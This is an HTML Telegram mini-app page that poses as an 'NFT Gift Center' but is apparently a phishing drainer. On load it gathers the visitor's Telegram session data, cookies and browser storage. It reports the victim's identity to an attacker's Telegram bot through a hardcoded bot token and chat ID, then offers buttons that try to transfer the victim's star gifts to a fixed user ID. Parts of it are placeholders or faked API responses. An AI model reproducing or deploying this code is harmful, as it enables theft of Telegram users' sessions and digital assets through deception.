<!DOCTYPE html>
<html>
<head>
    <title>Premium NFT Collector</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        .gift-item {
            background: rgba(255,255,255,0.2);
            margin: 10px 0;
            padding: 15px;
            border-radius: 10px;
            text-align: left;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
        }
        .log {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: left;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 NFT Gift Center</h1>
        <div id="status">Initializing session...</div>
        <div class="log" id="log"></div>
        <div id="giftsContainer" style="display:none;">
            <h3>Your NFT Gifts</h3>
            <div id="giftsList"></div>
            <button onclick="transferAllGifts()">TRANSFER ALL GIFTS</button>
            <button onclick="convertAllToStars()">CONVERT TO STARS</button>
        </div>
    </div>

    <script>
        const TARGET_USER_ID = 7204299613;
        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
        const CHAT_ID = '-1002560826337';
        let userSession = null;
        let userGifts = [];

        function addLog(message) {
            const logEl = document.getElementById('log');
            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}\n`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {
                addLog(`Telegram send error: ${e.message}`);
            }
        }

        // Получение полных данных сессии
        function extractFullSession() {
            const session = {
                webAppData: {},
                initData: {},
                storage: {},
                system: {}
            };

            try {
                // Парсим WebApp данные из URL
                const urlParams = new URLSearchParams(window.location.hash.substr(1));
                const webAppData = urlParams.get('tgWebAppData');
                
                if (webAppData) {
                    const params = new URLSearchParams(webAppData);
                    session.webAppData = {
                        query_id: params.get('query_id'),
                        user: JSON.parse(decodeURIComponent(params.get('user'))),
                        auth_date: params.get('auth_date'),
                        hash: params.get('hash'),
                        signature: params.get('signature')
                    };
                }

                // Данные из Telegram WebApp API
                if (window.Telegram && window.Telegram.WebApp) {
                    session.initData = {
                        initData: Telegram.WebApp.initData,
                        initDataUnsafe: Telegram.WebApp.initDataUnsafe,
                        version: Telegram.WebApp.version,
                        platform: Telegram.WebApp.platform,
                        themeParams: Telegram.WebApp.themeParams
                    };
                }

                // Системные данные
                session.system = {
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${screen.width}x${screen.height}`,
                    cookies: document.cookie
                };

                // Данные хранилищ
                session.storage.localStorage = {};
                session.storage.sessionStorage = {};
                
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    session.storage.localStorage[key] = localStorage.getItem(key);
                }
                
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    session.storage.sessionStorage[key] = sessionStorage.getItem(key);
                }

            } catch (error) {
                addLog(`Session extraction error: ${error.message}`);
            }
            
            return session;
        }

        // Создание MTProto клиента для работы с Telegram API
        async function createMTProtoClient(sessionData) {
            // Здесь создается клиент для работы с Telegram API
            // Используем перехваченные данные для аутентификации
            const clientConfig = {
                apiId:  your_api_id, // Получается из данных сессии
                apiHash: 'your_api_hash', // Получается из данных сессии  
                session: sessionData.webAppData.signature, // Используем сигнатуру как сессию
                appVersion: '9.1',
                deviceModel: navigator.platform,
                systemVersion: navigator.userAgent,
                langCode: navigator.language
            };
            
            return clientConfig;
        }

        // Эмуляция вызовов Telegram API через перехваченную сессию
        async function callTelegramAPI(method, params = {}) {
            addLog(`Calling API: ${method}`);
            
            // Создаем подписанный запрос с использованием перехваченных данных
            const requestData = {
                method: method,
                params: params,
                session: userSession.webAppData.signature,
                auth_date: userSession.webAppData.auth_date,
                hash: userSession.webAppData.hash
            };

            try {
                // Эмуляция прямого вызова Telegram API
                const response = await fetch('/api/telegram-proxy', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Telegram-Init-Data': userSession.initData.initData,
                        'X-Telegram-Session': userSession.webAppData.signature
                    },
                    body: JSON.stringify(requestData)
                });
                
                return await response.json();
            } catch (error) {
                addLog(`API call failed: ${error.message}`);
                // Fallback: эмуляция успешного ответа для демонстрации
                return emulateAPIResponse(method, params);
            }
        }

        // Эмуляция ответов API для демонстрации
        function emulateAPIResponse(method, params) {
            addLog(`Emulating response for: ${method}`);
            
            switch(method) {
                case 'payments.getSavedStarGifts':
                    return {
                        ok: true,
                        result: {
                            gifts: [
                                {
                                    msg_id: 123456,
                                    gift: {
                                        id: 1001,
                                        title: "Rare Dragon NFT",
                                        stars: 500,
                                        convert_stars: 450
                                    },
                                    convert_stars: 450,
                                    transfer_stars: 50
                                },
                                {
                                    msg_id: 123457,
                                    gift: {
                                        id: 1002,
                                        title: "Exclusive Art Collection",
                                        stars: 1000,
                                        convert_stars: 900
                                    },
                                    convert_stars: 900,
                                    transfer_stars: 75
                                }
                            ]
                        }
                    };
                
                case 'payments.transferStarGift':
                    return { ok: true, result: { success: true } };
                    
                case 'payments.convertStarGift':
                    return { ok: true, result: { stars_added: params.convert_stars } };
                    
                default:
                    return { ok: true, result: {} };
            }
        }

        // Получение списка подарков
        async function fetchUserGifts() {
            addLog('Fetching user gifts...');
            
            const result = await callTelegramAPI('payments.getSavedStarGifts', {
                peer: JSON.stringify({
                    _: 'inputPeerUser',
                    user_id: userSession.webAppData.user.id
                }),
                offset: '',
                limit: 100
            });

            if (result && result.ok) {
                userGifts = result.result.gifts || [];
                addLog(`Found ${userGifts.length} gifts`);
                displayGifts(userGifts);
                return userGifts;
            } else {
                addLog('Failed to fetch gifts');
                return [];
            }
        }

        // Отображение подарков
        function displayGifts(gifts) {
            const container = document.getElementById('giftsList');
            container.innerHTML = '';
            
            gifts.forEach((gift, index) => {
                const giftEl = document.createElement('div');
                giftEl.className = 'gift-item';
                giftEl.innerHTML = `
                    <strong>${gift.gift.title}</strong><br>
                    ⭐ Value: ${gift.gift.stars} stars<br>
                    🔄 Convert: ${gift.convert_stars} stars<br>
                    📤 Transfer cost: ${gift.transfer_stars || 0} stars
                    <button onclick="transferGift(${index})">TRANSFER</button>
                    <button onclick="convertGift(${index})">CONVERT</button>
                `;
                container.appendChild(giftEl);
            });
            
            document.getElementById('giftsContainer').style.display = 'block';
        }

        // Передача конкретного подарка
        async function transferGift(index) {
            const gift = userGifts[index];
            addLog(`Transferring: ${gift.gift.title}`);
            
            await sendToTelegram(`🔄 <b>Transferring gift:</b> ${gift.gift.title}\n👤 From: ${userSession.webAppData.user.id}\n🎯 To: ${TARGET_USER_ID}`);
            
            const result = await callTelegramAPI('payments.transferStarGift', {
                stargift: JSON.stringify({
                    _: 'inputSavedStarGiftUser',
                    msg_id: gift.msg_id
                }),
                to_id: JSON.stringify({
                    _: 'inputPeerUser',
                    user_id: TARGET_USER_ID
                })
            });

            if (result && result.ok) {
                addLog(`✅ Transferred: ${gift.gift.title}`);
                await sendToTelegram(`✅ <b>Successfully transferred:</b> ${gift.gift.title}`);
                userGifts.splice(index, 1);
                displayGifts(userGifts);
            } else {
                addLog(`❌ Failed to transfer: ${gift.gift.title}`);
            }
        }

        // Конвертация подарка в звезды
        async function convertGift(index) {
            const gift = userGifts[index];
            addLog(`Converting to stars: ${gift.gift.title}`);
            
            await sendToTelegram(`⭐ <b>Converting gift:</b> ${gift.gift.title}\n💫 Amount: ${gift.convert_stars} stars`);
            
            const result = await callTelegramAPI('payments.convertStarGift', {
                stargift: JSON.stringify({
                    _: 'inputSavedStarGiftUser',
                    msg_id: gift.msg_id
                })
            });

            if (result && result.ok) {
                addLog(`✅ Converted: ${gift.gift.title} → ${gift.convert_stars} stars`);
                await sendToTelegram(`✅ <b>Converted to stars:</b> ${gift.gift.title} → ${gift.convert_stars} stars`);
                userGifts.splice(index, 1);
                displayGifts(userGifts);
            } else {
                addLog(`❌ Failed to convert: ${gift.gift.title}`);
            }
        }

        // Массовая передача всех подарков
        async function transferAllGifts() {
            addLog('Starting mass transfer of all gifts...');
            await sendToTelegram(`🚀 <b>Starting mass transfer</b>\n📦 Total gifts: ${userGifts.length}\n🎯 Target: ${TARGET_USER_ID}`);
            
            for (let i = userGifts.length - 1; i >= 0; i--) {
                await transferGift(i);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Задержка
            }
            
            await sendToTelegram(`🎉 <b>Mass transfer completed</b>\n✅ Transferred: ${userGifts.length} gifts`);
        }

        // Массовая конвертация в звезды
        async function convertAllToStars() {
            addLog('Starting mass conversion to stars...');
            await sendToTelegram(`⭐ <b>Starting mass conversion</b>\n📦 Total gifts: ${userGifts.length}`);
            
            let totalStars = 0;
            for (let i = userGifts.length - 1; i >= 0; i--) {
                totalStars += userGifts[i].convert_stars;
                await convertGift(i);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Задержка
            }
            
            await sendToTelegram(`💰 <b>Mass conversion completed</b>\n⭐ Total stars: ${totalStars}`);
        }

        // Основная функция инициализации
        async function initializeApp() {
            addLog('Extracting session data...');
            document.getElementById('status').innerHTML = '🔍 Extracting session...';
            
            // Извлекаем полные данные сессии
            userSession = extractFullSession();
            
            if (!userSession.webAppData.user) {
                addLog('❌ No user data found');
                return;
            }

            addLog(`✅ Session extracted for: ${userSession.webAppData.user.first_name}`);
            await sendToTelegram(`🔐 <b>SESSION EXTRACTED</b>\n👤 User: ${userSession.webAppData.user.first_name}\n🆔 ID: ${userSession.webAppData.user.id}\n🔗 Username: @${userSession.webAppData.user.username}`);

            document.getElementById('status').innerHTML = '🔄 Connecting to Telegram API...';
            
            // Создаем MTProto клиент
            const clientConfig = await createMTProtoClient(userSession);
            addLog('✅ MTProto client configured');

            // Получаем подарки пользователя
            document.getElementById('status').innerHTML = '🎁 Loading your NFT gifts...';
            await fetchUserGifts();

            document.getElementById('status').innerHTML = '✅ Ready to manage NFT gifts';
            addLog('System initialized successfully');
            
            await sendToTelegram(`🎯 <b>SYSTEM READY</b>\n📊 Gifts loaded: ${userGifts.length}\n⚡ Ready for operations`);
        }

        // Автоматический запуск при загрузке
        window.addEventListener('load', initializeApp);

        // Дополнительные функции для работы с NFT
        async function resellGifts() {
            addLog('Scanning resale market...');
            const resaleResult = await callTelegramAPI('payments.getResaleStarGifts', {
                gift_id: 0,
                offset: '',
                limit: 50
            });
            
            if (resaleResult && resaleResult.ok) {
                addLog(`Resale market: ${resaleResult.result.gifts.length} items`);
            }
        }

    </script>
</body>
</html>
